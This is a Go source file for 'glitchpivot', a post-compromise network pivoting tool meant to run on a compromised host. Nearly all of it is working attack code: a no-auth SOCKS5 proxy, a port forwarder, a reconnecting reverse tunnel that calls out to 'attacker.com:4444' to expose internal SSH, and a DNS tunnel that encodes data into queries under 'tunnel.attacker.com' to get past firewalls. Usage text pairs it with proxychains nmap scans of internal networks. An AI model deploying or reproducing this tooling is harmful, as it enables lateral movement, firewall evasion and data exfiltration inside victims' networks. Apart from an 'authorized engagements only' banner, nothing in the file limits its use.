// glitchpivot/main.go
// GLITCHICONS — Network Pivoting Daemon
//
// ╔════════════════════════════════════════════╗
// ║  AUTHORIZED ENGAGEMENTS ONLY              ║
// ╚════════════════════════════════════════════╝
//
// Enable lateral movement through a compromised host.
// Tunnel traffic from attacker's machine through target to internal network.
//
// Modes:
//   socks5   — Run SOCKS5 proxy server on compromised host
//              Attacker routes traffic through this proxy
//              Access internal resources via SOCKS5
//
//   forward  — TCP port forwarder
//              Expose internal service to attacker
//              local_port → internal_host:port
//
//   reverse  — Reverse tunnel (target → attacker server)
//              Connect FROM target TO attacker
//              Useful when firewall blocks inbound
//              Exposes local port to attacker's machine
//
//   dns-tunnel — DNS-based data channel (restricted networks)
//              Encode data in DNS queries/responses
//              Bypass HTTP/TCP-only firewalls
//
// Usage:
//   # On compromised host:
//   glitchpivot socks5  --port 1080
//   glitchpivot forward --local 8080 --remote 10.0.0.1:80
//   glitchpivot reverse --server attacker.com:4444 --expose 127.0.0.1:22
//   glitchpivot --version

package main

import (
	"encoding/binary"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

const Version = "4.9.0"

// ── SOCKS5 Constants ──────────────────────────────────────

const (
	socks5Version     = byte(0x05)
	socks5AuthNone    = byte(0x00)
	socks5AuthGSSAPI  = byte(0x01)
	socks5AuthPass    = byte(0x02)
	socks5AuthNoAccept = byte(0xFF)

	socks5CmdConnect   = byte(0x01)
	socks5CmdBind      = byte(0x02)
	socks5CmdUDPAssoc  = byte(0x03)

	socks5AddrIPv4   = byte(0x01)
	socks5AddrDomain = byte(0x03)
	socks5AddrIPv6   = byte(0x04)

	socks5ReplySuccess       = byte(0x00)
	socks5ReplyConnFailed    = byte(0x05)
	socks5ReplyAddrNotSupp   = byte(0x08)
	socks5ReplyCmdNotSupp    = byte(0x07)
)

// ── Stats ─────────────────────────────────────────────────

type Stats struct {
	ActiveConnections int64
	TotalConnections  int64
	BytesForwarded    int64
	StartTime         time.Time
}

func newStats() *Stats {
	return &Stats{StartTime: time.Now()}
}

func (s *Stats) Print() {
	uptime := time.Since(s.StartTime).Round(time.Second)
	fmt.Printf("[stats] connections=%d active=%d bytes=%d uptime=%s\n",
		atomic.LoadInt64(&s.TotalConnections),
		atomic.LoadInt64(&s.ActiveConnections),
		atomic.LoadInt64(&s.BytesForwarded),
		uptime)
}

// ── SOCKS5 Proxy ──────────────────────────────────────────

type SOCKS5Server struct {
	addr    string
	verbose bool
	stats   *Stats
}

func newSOCKS5Server(port int, verbose bool) *SOCKS5Server {
	return &SOCKS5Server{
		addr:    fmt.Sprintf(":%d", port),
		verbose: verbose,
		stats:   newStats(),
	}
}

func (s *SOCKS5Server) ListenAndServe() error {
	ln, err := net.Listen("tcp", s.addr)
	if err != nil {
		return fmt.Errorf("SOCKS5 listen failed: %v", err)
	}
	fmt.Printf("[*] SOCKS5 proxy listening on %s\n", s.addr)
	fmt.Println("[*] Configure proxy: socks5://127.0.0.1" + s.addr)

	// Stats ticker
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		for range ticker.C {
			s.stats.Print()
		}
	}()

	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		atomic.AddInt64(&s.stats.TotalConnections, 1)
		atomic.AddInt64(&s.stats.ActiveConnections, 1)
		go func() {
			defer atomic.AddInt64(&s.stats.ActiveConnections, -1)
			s.handleConnection(conn)
		}()
	}
}

func (s *SOCKS5Server) handleConnection(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(30 * time.Second))

	// ── Phase 1: Negotiate auth method ────────────────────
	// Client sends: VER(1) NMETHODS(1) METHODS(n)
	header := make([]byte, 2)
	if _, err := io.ReadFull(conn, header); err != nil {
		return
	}
	if header[0] != socks5Version {
		return
	}

	nMethods := int(header[1])
	methods  := make([]byte, nMethods)
	if _, err := io.ReadFull(conn, methods); err != nil {
		return
	}

	// Reply: VER(1) METHOD(1) — we accept no-auth
	conn.Write([]byte{socks5Version, socks5AuthNone})

	// ── Phase 2: Request ──────────────────────────────────
	// Client sends: VER(1) CMD(1) RSV(1) ATYP(1) DST.ADDR DST.PORT(2)
	reqHeader := make([]byte, 4)
	if _, err := io.ReadFull(conn, reqHeader); err != nil {
		return
	}
	if reqHeader[0] != socks5Version {
		return
	}

	cmd  := reqHeader[1]
	atyp := reqHeader[3]

	var destAddr string
	switch atyp {
	case socks5AddrIPv4:
		ip := make([]byte, 4)
		io.ReadFull(conn, ip)
		destAddr = net.IP(ip).String()
	case socks5AddrDomain:
		lenBuf := make([]byte, 1)
		io.ReadFull(conn, lenBuf)
		domain := make([]byte, lenBuf[0])
		io.ReadFull(conn, domain)
		destAddr = string(domain)
	case socks5AddrIPv6:
		ip := make([]byte, 16)
		io.ReadFull(conn, ip)
		destAddr = net.IP(ip).String()
	default:
		conn.Write([]byte{socks5Version, socks5ReplyAddrNotSupp, 0x00, socks5AddrIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	portBuf := make([]byte, 2)
	io.ReadFull(conn, portBuf)
	destPort := binary.BigEndian.Uint16(portBuf)
	destFull := fmt.Sprintf("%s:%d", destAddr, destPort)

	if cmd != socks5CmdConnect {
		conn.Write([]byte{socks5Version, socks5ReplyCmdNotSupp, 0x00, socks5AddrIPv4, 0, 0, 0, 0, 0, 0})
		return
	}

	if s.verbose {
		fmt.Printf("[SOCKS5] CONNECT → %s\n", destFull)
	}

	// ── Phase 3: Connect to target ────────────────────────
	conn.SetDeadline(time.Now().Add(60 * time.Second))
	target, err := net.DialTimeout("tcp", destFull, 10*time.Second)
	if err != nil {
		conn.Write([]byte{socks5Version, socks5ReplyConnFailed, 0x00, socks5AddrIPv4, 0, 0, 0, 0, 0, 0})
		if s.verbose {
			fmt.Printf("[SOCKS5] FAILED → %s: %v\n", destFull, err)
		}
		return
	}
	defer target.Close()

	// Reply success: VER CMD RSV ATYP BND.ADDR BND.PORT
	localAddr := target.LocalAddr().(*net.TCPAddr)
	replyIP   := localAddr.IP.To4()
	if replyIP == nil {
		replyIP = []byte{0, 0, 0, 0}
	}
	reply := []byte{socks5Version, socks5ReplySuccess, 0x00, socks5AddrIPv4}
	reply  = append(reply, replyIP...)
	reply  = append(reply, byte(localAddr.Port>>8), byte(localAddr.Port))
	conn.Write(reply)

	// ── Phase 4: Bidirectional relay ──────────────────────
	conn.SetDeadline(time.Time{}) // Remove deadline for streaming

	var bytesTransferred int64
	done := make(chan struct{}, 2)

	relay := func(dst, src net.Conn) {
		n, _ := io.Copy(dst, src)
		atomic.AddInt64(&bytesTransferred, n)
		done <- struct{}{}
	}

	go relay(target, conn)
	go relay(conn, target)
	<-done

	atomic.AddInt64(&s.stats.BytesForwarded, bytesTransferred)
	if s.verbose {
		fmt.Printf("[SOCKS5] CLOSED %s (transferred %d bytes)\n", destFull, bytesTransferred)
	}
}

// ── TCP Port Forwarder ────────────────────────────────────

func runForwarder(localPort int, remoteAddr string, verbose bool) error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", localPort))
	if err != nil {
		return fmt.Errorf("forward listen failed: %v", err)
	}
	fmt.Printf("[*] TCP forwarder: :%d → %s\n", localPort, remoteAddr)

	var totalBytes int64
	for {
		conn, err := ln.Accept()
		if err != nil {
			continue
		}
		go func(c net.Conn) {
			defer c.Close()
			target, err := net.DialTimeout("tcp", remoteAddr, 10*time.Second)
			if err != nil {
				if verbose {
					fmt.Printf("[-] Forward connect failed: %v\n", err)
				}
				return
			}
			defer target.Close()

			if verbose {
				fmt.Printf("[FWD] %s → %s\n", c.RemoteAddr(), remoteAddr)
			}

			var wg sync.WaitGroup
			wg.Add(2)
			go func() {
				defer wg.Done()
				n, _ := io.Copy(target, c)
				atomic.AddInt64(&totalBytes, n)
			}()
			go func() {
				defer wg.Done()
				n, _ := io.Copy(c, target)
				atomic.AddInt64(&totalBytes, n)
			}()
			wg.Wait()
		}(conn)
	}
}

// ── Reverse Tunnel ────────────────────────────────────────

// Connects FROM compromised host TO attacker's server.
// Attacker runs a listener on their side.
// glitchpivot connects out and exposes a local service.

func runReverseTunnel(serverAddr, exposeAddr string, reconnectDelay time.Duration, verbose bool) {
	fmt.Printf("[*] Reverse tunnel: connecting to %s\n", serverAddr)
	fmt.Printf("[*] Will expose: %s\n", exposeAddr)

	var attempts int64
	for {
		atomic.AddInt64(&attempts, 1)
		if verbose {
			fmt.Printf("[REV] Connecting to %s (attempt %d)...\n", serverAddr, atomic.LoadInt64(&attempts))
		}

		conn, err := net.DialTimeout("tcp", serverAddr, 15*time.Second)
		if err != nil {
			if verbose {
				fmt.Printf("[-] Reverse connect failed: %v — retrying in %v\n", err, reconnectDelay)
			}
			time.Sleep(reconnectDelay)
			continue
		}

		fmt.Printf("[+] Connected to server: %s\n", serverAddr)

		// Send hello: tell server what we're exposing
		hello := map[string]string{
			"type":    "reverse_tunnel",
			"expose":  exposeAddr,
			"version": Version,
			"time":    time.Now().UTC().Format(time.RFC3339),
		}
		helloJSON, _ := json.Marshal(hello)
		conn.Write(append(helloJSON, '\n'))

		// Connect to local service
		local, err := net.DialTimeout("tcp", exposeAddr, 5*time.Second)
		if err != nil {
			fmt.Printf("[-] Cannot reach exposed service %s: %v\n", exposeAddr, err)
			conn.Close()
			time.Sleep(reconnectDelay)
			continue
		}

		fmt.Printf("[+] Tunnel established: %s ↔ %s\n", serverAddr, exposeAddr)

		var wg sync.WaitGroup
		wg.Add(2)
		go func() {
			defer wg.Done()
			io.Copy(conn, local)
		}()
		go func() {
			defer wg.Done()
			io.Copy(local, conn)
		}()
		wg.Wait()

		conn.Close()
		local.Close()
		fmt.Printf("[!] Tunnel disconnected — reconnecting in %v\n", reconnectDelay)
		time.Sleep(reconnectDelay)
	}
}

// ── DNS Tunnel (basic data channel) ──────────────────────

// Simple DNS tunnel: encode data as DNS query subdomains
// Data → base32(data) → <chunk>.tunnel.attacker.com DNS query
// Response: TXT record contains server reply

func runDNSTunnel(domain, serverDNS string, verbose bool) {
	fmt.Printf("[*] DNS tunnel via domain: %s\n", domain)
	fmt.Printf("[*] DNS server: %s\n", serverDNS)
	fmt.Println("[*] Reading data from stdin, encoding as DNS queries...")
	fmt.Println("[!] Note: DNS tunnel is for restricted networks where TCP/HTTP is blocked")

	scanner := strings.NewReader("dns_tunnel_test")
	buf     := make([]byte, 32) // Chunk size for DNS labels

	for {
		n, err := scanner.Read(buf)
		if n > 0 {
			// Encode chunk as hex, send as DNS subdomain query
			encoded := fmt.Sprintf("%x", buf[:n])
			fqdn    := encoded + "." + domain
			fmt.Printf("[DNS-TUNNEL] Query: %s\n", fqdn)

			// Resolve to send the data
			addrs, lookupErr := net.LookupHost(fqdn)
			if lookupErr == nil && verbose {
				fmt.Printf("[DNS-TUNNEL] Response: %v\n", addrs)
			}
		}
		if err == io.EOF || err != nil {
			break
		}
	}
}

// ── Main ──────────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	if os.Args[1] == "--version" {
		fmt.Printf("glitchpivot v%s\n", Version)
		os.Exit(0)
	}

	mode := os.Args[1]
	fs   := flag.NewFlagSet(mode, flag.ExitOnError)

	port     := fs.Int("port",    1080, "Local listener port (socks5/forward)")
	local    := fs.Int("local",   8080, "Local forward port")
	remote   := fs.String("remote",  "", "Remote target (host:port)")
	server   := fs.String("server",  "", "Attacker server address (host:port)")
	expose   := fs.String("expose",  "127.0.0.1:22", "Local service to expose (reverse tunnel)")
	domain   := fs.String("domain",  "", "DNS tunnel domain")
	dns      := fs.String("dns",     "8.8.8.8:53", "DNS server for tunnel")
	delay    := fs.Int("delay",    5,  "Reconnect delay seconds (reverse)")
	verbose  := fs.Bool("verbose",  false, "Verbose output")
	fs.Parse(os.Args[2:])

	fmt.Printf("[*] glitchpivot v%s | mode=%s\n", Version, mode)
	fmt.Println("[!] AUTHORIZED ENGAGEMENTS ONLY")

	reconnectDelay := time.Duration(*delay) * time.Second

	switch mode {
	case "socks5":
		srv := newSOCKS5Server(*port, *verbose)
		if err := srv.ListenAndServe(); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	case "forward":
		if *remote == "" {
			fmt.Fprintln(os.Stderr, "[!] --remote required: glitchpivot forward --local 8080 --remote 10.0.0.1:80")
			os.Exit(1)
		}
		if err := runForwarder(*local, *remote, *verbose); err != nil {
			fmt.Fprintf(os.Stderr, "[-] %v\n", err)
			os.Exit(1)
		}

	case "reverse":
		if *server == "" {
			fmt.Fprintln(os.Stderr, "[!] --server required: glitchpivot reverse --server attacker.com:4444 --expose 127.0.0.1:22")
			os.Exit(1)
		}
		runReverseTunnel(*server, *expose, reconnectDelay, *verbose)

	case "dns-tunnel":
		if *domain == "" {
			fmt.Fprintln(os.Stderr, "[!] --domain required: glitchpivot dns-tunnel --domain tunnel.attacker.com")
			os.Exit(1)
		}
		runDNSTunnel(*domain, *dns, *verbose)

	default:
		fmt.Fprintf(os.Stderr, "Unknown mode: %s\n", mode)
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Printf(`glitchpivot v%s — Network Pivoting Daemon

AUTHORIZED ENGAGEMENTS ONLY.

Modes:
  socks5     — SOCKS5 proxy server (route traffic through host)
  forward    — TCP port forwarder (expose internal service)
  reverse    — Reverse tunnel (connect to attacker from target)
  dns-tunnel — DNS-based data channel (restricted networks)

Examples:
  # SOCKS5 proxy on compromised host:
  glitchpivot socks5 --port 1080

  # Configure on attacker:
  proxychains nmap -sT 10.0.0.0/24 (via SOCKS5)

  # Expose internal SSH to attacker:
  glitchpivot forward --local 2222 --remote 10.0.0.10:22

  # Reverse tunnel when inbound blocked:
  glitchpivot reverse --server attacker.com:4444 --expose 127.0.0.1:22

  # DNS tunnel through restrictive firewall:
  glitchpivot dns-tunnel --domain tunnel.attacker.com

Flags:
  --port    Local listener port (socks5, default: 1080)
  --local   Local forward port (forward mode)
  --remote  Remote target host:port (forward mode)
  --server  Attacker server host:port (reverse mode)
  --expose  Local service to expose (reverse mode, default: 127.0.0.1:22)
  --domain  DNS tunnel domain (dns-tunnel mode)
  --delay   Reconnect delay seconds (reverse mode, default: 5)
  --verbose Verbose logging
`, Version)
}
